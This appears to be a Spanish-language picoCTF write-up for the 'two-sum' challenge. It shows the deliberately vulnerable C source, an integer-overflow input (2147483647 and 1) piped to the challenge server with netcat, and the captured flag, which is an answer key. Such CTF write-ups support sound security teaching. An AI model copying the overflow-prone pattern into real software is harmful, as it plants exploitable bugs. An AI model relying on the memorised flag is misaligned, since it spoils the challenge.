# two-sum

# Descripción
Can you solve this?What two positive numbers can make this possible: `n1 > n1 + n2 OR n2 > n1 + n2`Enter them here `nc saturn.picoctf.net 50366`. [Source](https://artifacts.picoctf.net/c/454/flag.c)
# Pistas
Integer overflow

Not necessarily a math problem
# Solución

```bash
adalh4ck1ng-picoctf@webshell:~$ cat 
.bash_history    .bashrc          .config/         .lesshst         .profile         .ssh/            README.txt       flag.txt         
.bash_logout     .cache/          .gitconfig       .local/          .python_history  .wget-hsts       flag.c           
adalh4ck1ng-picoctf@webshell:~$ cat flag.c
#include <stdio.h>
#include <stdlib.h>

static int addIntOvf(int result, int a, int b) {
    result = a + b;
    if(a > 0 && b > 0 && result < 0)
        return -1;
    if(a < 0 && b < 0 && result > 0)
        return -1;
    return 0;
}

int main() {
    int num1, num2, sum;
    FILE *flag;
    char c;

    printf("n1 > n1 + n2 OR n2 > n1 + n2 \n");
    fflush(stdout);
    printf("What two positive numbers can make this possible: \n");
    fflush(stdout);
    
    if (scanf("%d", &num1) && scanf("%d", &num2)) {
        printf("You entered %d and %d\n", num1, num2);
        fflush(stdout);
        sum = num1 + num2;
        if (addIntOvf(sum, num1, num2) == 0) {
            printf("No overflow\n");
            fflush(stdout);
            exit(0);
        } else if (addIntOvf(sum, num1, num2) == -1) {
            printf("You have an integer overflow\n");
            fflush(stdout);
        }

        if (num1 > 0 || num2 > 0) {
            flag = fopen("flag.txt","r");
            if(flag == NULL){
                printf("flag not found: please run this on the server\n");
                fflush(stdout);
                exit(0);
            }
            char buf[60];
            fgets(buf, 59, flag);
            printf("YOUR FLAG IS: %s\n", buf);
            fflush(stdout);
            exit(0);
        }
    }
    return 0;
}
adalh4ck1ng-picoctf@webshell:~$ 

# La cantidad de bits posibles para dar el valor numerico (exceptuando el bit 0 que se usa para determinar el signo, es 2^31)
es decir: 2147483647

adalh4ck1ng-picoctf@webshell:~$  nc saturn.picoctf.net 50366
n1 > n1 + n2 OR n2 > n1 + n2 
What two positive numbers can make this possible: 
echo -e "2147483647\n1"
^C
adalh4ck1ng-picoctf@webshell:~$ echo -e "2147483647\n1" | nc saturn.picoctf.net 50366
n1 > n1 + n2 OR n2 > n1 + n2 
What two positive numbers can make this possible: 
You entered 2147483647 and 1
You have an integer overflow
YOUR FLAG IS: picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_f6ed8057}
```

# Bandera
picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_f6ed8057}